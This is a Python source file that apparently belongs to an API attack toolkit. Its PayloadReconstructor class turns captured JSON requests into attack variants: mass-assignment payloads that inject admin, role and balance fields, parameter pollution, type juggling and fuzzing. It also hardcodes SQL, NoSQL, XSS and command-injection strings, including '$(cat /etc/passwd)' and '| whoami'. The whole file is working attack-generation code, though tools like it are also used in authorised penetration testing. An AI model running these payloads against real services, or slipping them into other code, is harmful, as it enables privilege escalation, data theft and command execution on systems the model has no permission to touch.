"""
Payload Reconstructor - Rebuild JSON payloads for attacks
Uses extracted dictionaries to create attack variations
"""
import json
import random
from copy import deepcopy
from typing import Dict, List, Any, Optional


class PayloadReconstructor:
    """
    Reconstructs and manipulates JSON payloads for attack scenarios
    """

    def __init__(self, analysis_data: Dict[str, Any]):
        """
        Initialize with data from PayloadAnalyzer
        """
        self.schemas = analysis_data.get('schemas', {})
        self.key_value_dict = analysis_data.get('key_value_dictionary', {})
        self.payload_templates = analysis_data.get('payload_templates', {})
        self.nested_structures = analysis_data.get('nested_structures', {})

    def reconstruct_from_template(self, endpoint: str, method: str = 'POST',
                                  overrides: Optional[Dict[str, Any]] = None) -> Dict:
        """
        Reconstruct a payload from template with optional overrides
        """
        # Find matching template
        templates = self.payload_templates.get(endpoint, [])
        matching = [t for t in templates if t['method'] == method]

        if not matching:
            return {}

        # Use the most recent template
        base_payload = deepcopy(matching[-1]['payload'])

        # Apply overrides
        if overrides:
            base_payload = self._apply_overrides(base_payload, overrides)

        return base_payload

    def _apply_overrides(self, payload: Dict, overrides: Dict) -> Dict:
        """Apply override values to payload (supports nested keys)"""
        for key, value in overrides.items():
            # Handle nested keys with dot notation: user.id
            if '.' in key:
                self._set_nested_value(payload, key, value)
            else:
                payload[key] = value

        return payload

    @staticmethod
    def _set_nested_value(obj: Dict, path: str, value: Any):
        """Set value in nested dict using dot notation"""
        keys = path.split('.')
        current = obj

        for key in keys[:-1]:
            if key not in current:
                current[key] = {}
            current = current[key]

        current[keys[-1]] = value

    def generate_mass_assignment_payloads(self, base_payload: Dict,
                                          dangerous_params: Optional[List[str]] = None) -> List[Dict]:
        """
        Generate mass assignment attack payloads
        Injects dangerous parameters into base payload
        """
        if dangerous_params is None:
            dangerous_params = [
                'is_admin', 'admin', 'role', 'permissions', 'privilege',
                'is_superuser', 'superuser', 'access_level', 'credits',
                'balance', 'premium', 'verified', 'approved'
            ]

        payloads = []

        # Strategy 1: Add single dangerous param
        for param in dangerous_params:
            payload = deepcopy(base_payload)
            payload[param] = self._get_dangerous_value(param)
            payloads.append({
                'payload': payload,
                'attack': f'mass_assignment_{param}',
                'description': f'Injecting {param} parameter'
            })

        # Strategy 2: Combine multiple dangerous params
        payload = deepcopy(base_payload)
        for param in dangerous_params[:5]:  # Top 5
            payload[param] = self._get_dangerous_value(param)
        payloads.append({
            'payload': payload,
            'attack': 'mass_assignment_combined',
            'description': 'Multiple privilege escalation params'
        })

        # Strategy 3: Inject into nested structures
        for nested_path in self.nested_structures.keys():
            for param in dangerous_params[:3]:
                payload = deepcopy(base_payload)
                self._set_nested_value(payload, f"{nested_path}.{param}",
                                       self._get_dangerous_value(param))
                payloads.append({
                    'payload': payload,
                    'attack': f'mass_assignment_nested_{param}',
                    'description': f'Nested injection in {nested_path}'
                })

        return payloads

    @staticmethod
    def _get_dangerous_value(param: str) -> Any:
        """Get appropriate dangerous value for parameter"""
        boolean_params = ['is_admin', 'admin', 'is_superuser', 'superuser',
                          'premium', 'verified', 'approved']
        numeric_params = ['credits', 'balance', 'access_level', 'privilege']
        string_params = ['role', 'permissions']

        if param in boolean_params:
            return True
        elif param in numeric_params:
            return 999999
        elif param in string_params:
            if 'role' in param:
                return 'admin'
            elif 'permission' in param:
                return ['*', 'admin', 'superuser']
        return True

    def generate_parameter_pollution(self, base_payload: Dict) -> List[Dict]:
        """
        Generate HTTP Parameter Pollution payloads
        Duplicate parameters with different values
        """
        payloads = []

        for key in base_payload.keys():
            if isinstance(base_payload[key], (str, int, bool)):
                # Strategy: Duplicate key with array
                payload = deepcopy(base_payload)
                original_value = payload[key]

                # Try different values
                variations = self._get_key_variations(key)

                for var in variations[:3]:
                    payload_array = deepcopy(base_payload)
                    payload_array[key] = [original_value, var]
                    payloads.append({
                        'payload': payload_array,
                        'attack': f'hpp_{key}',
                        'description': f'Parameter pollution on {key}'
                    })

        return payloads

    @staticmethod
    def generate_type_juggling_payloads(base_payload: Dict) -> List[Dict]:
        """
        Generate type juggling attack payloads
        Change data types to bypass validation
        """
        payloads = []

        for key, value in base_payload.items():
            if not isinstance(value, (dict, list)):
                # String to int/bool
                if isinstance(value, str):
                    payloads.append({
                        'payload': {**deepcopy(base_payload), key: 1},
                        'attack': f'type_juggling_{key}_str_to_int',
                        'description': f'String to int on {key}'
                    })
                    payloads.append({
                        'payload': {**deepcopy(base_payload), key: True},
                        'attack': f'type_juggling_{key}_str_to_bool',
                        'description': f'String to bool on {key}'
                    })

                # Int to string
                elif isinstance(value, int):
                    payloads.append({
                        'payload': {**deepcopy(base_payload), key: str(value)},
                        'attack': f'type_juggling_{key}_int_to_str',
                        'description': f'Int to string on {key}'
                    })

                # Bool to int/string
                elif isinstance(value, bool):
                    payloads.append({
                        'payload': {**deepcopy(base_payload), key: int(value)},
                        'attack': f'type_juggling_{key}_bool_to_int',
                        'description': f'Bool to int on {key}'
                    })

        return payloads

    @staticmethod
    def generate_injection_payloads(base_payload: Dict,
                                    injection_type: str = 'all') -> List[Dict]:
        """
        Generate various injection payloads (SQLi, NoSQLi, XSS, etc.)
        """
        payloads = []

        sqli_vectors = [
            "' OR '1'='1", "' OR 1=1--", "admin'--",
            "' UNION SELECT NULL--", "1' AND '1'='1"
        ]

        nosqli_vectors = [
            {"$ne": None}, {"$gt": ""}, {"$regex": ".*"}
        ]

        xss_vectors = [
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>"
        ]

        command_vectors = [
            "; ls -la", "| whoami", "`id`",
            "$(cat /etc/passwd)"
        ]

        for key, value in base_payload.items():
            if isinstance(value, str):
                # SQL Injection
                if injection_type in ['all', 'sql']:
                    for vector in sqli_vectors:
                        payloads.append({
                            'payload': {**deepcopy(base_payload), key: vector},
                            'attack': f'sqli_{key}',
                            'description': f'SQL injection in {key}'
                        })

                # XSS
                if injection_type in ['all', 'xss']:
                    for vector in xss_vectors:
                        payloads.append({
                            'payload': {**deepcopy(base_payload), key: vector},
                            'attack': f'xss_{key}',
                            'description': f'XSS injection in {key}'
                        })

                # Command Injection
                if injection_type in ['all', 'command']:
                    for vector in command_vectors:
                        payloads.append({
                            'payload': {**deepcopy(base_payload), key: value + vector},
                            'attack': f'cmdi_{key}',
                            'description': f'Command injection in {key}'
                        })

            # NoSQL Injection (replace value with object)
            if injection_type in ['all', 'nosql']:
                for vector in nosqli_vectors:
                    payloads.append({
                        'payload': {**deepcopy(base_payload), key: vector},
                        'attack': f'nosqli_{key}',
                        'description': f'NoSQL injection in {key}'
                    })

        return payloads

    def generate_fuzzing_variations(self, base_payload: Dict,
                                    num_variations: int = 10) -> List[Dict]:
        """
        Generate random fuzzing variations using extracted dictionary
        """
        variations = []

        for _ in range(num_variations):
            payload = deepcopy(base_payload)

            # Randomly modify some keys
            keys_to_modify = random.sample(list(payload.keys()),
                                           min(3, len(payload)))

            for key in keys_to_modify:
                variations_for_key = self._get_key_variations(key)
                if variations_for_key:
                    payload[key] = random.choice(variations_for_key)

            variations.append({
                'payload': payload,
                'attack': f'fuzzing_variation_{_}',
                'description': 'Random fuzzing variation'
            })

        return variations

    def _get_key_variations(self, key: str) -> List[Any]:
        """Get observed variations for a key from dictionary"""
        kv_data = self.key_value_dict.get(key, {})
        variations = kv_data.get('variations', [])

        if not variations:
            # Generate some generic variations based on type
            value_type = kv_data.get('value_type', 'string')
            if value_type == 'int':
                return [0, 1, -1, 999, 2147483647]
            elif value_type == 'string':
                return ['', 'test', 'admin', 'null', ' ']
            elif value_type == 'bool':
                return [True, False, 'true', 'false', 1, 0]

        return list(variations)

    def generate_attack_suite(self, endpoint: str, method: str = 'POST',
                              attack_types: Optional[List[str]] = None) -> Dict[str, List[Dict]]:
        """
        Generate comprehensive attack suite for an endpoint
        """
        if attack_types is None:
            attack_types = ['mass_assignment', 'injection', 'type_juggling',
                            'parameter_pollution', 'fuzzing']

        base_payload = self.reconstruct_from_template(endpoint, method)

        if not base_payload:
            return {'error': 'No template found for endpoint'}

        suite = {}

        if 'mass_assignment' in attack_types:
            suite['mass_assignment'] = self.generate_mass_assignment_payloads(base_payload)

        if 'injection' in attack_types:
            suite['injection'] = self.generate_injection_payloads(base_payload)

        if 'type_juggling' in attack_types:
            suite['type_juggling'] = self.generate_type_juggling_payloads(base_payload)

        if 'parameter_pollution' in attack_types:
            suite['parameter_pollution'] = self.generate_parameter_pollution(base_payload)

        if 'fuzzing' in attack_types:
            suite['fuzzing'] = self.generate_fuzzing_variations(base_payload, num_variations=5)

        return suite

    def export_attack_payloads(self, output_path: str, endpoint: str, method: str = 'POST'):
        """Export generated attack payloads to file"""
        suite = self.generate_attack_suite(endpoint, method)

        with open(output_path, 'w') as f:
            json.dump(suite, f, indent=2, default=str)

        total_payloads = sum(len(v) for v in suite.values() if isinstance(v, list))
        print(f"[PayloadReconstructor] Exported {total_payloads} attack payloads to {output_path}")
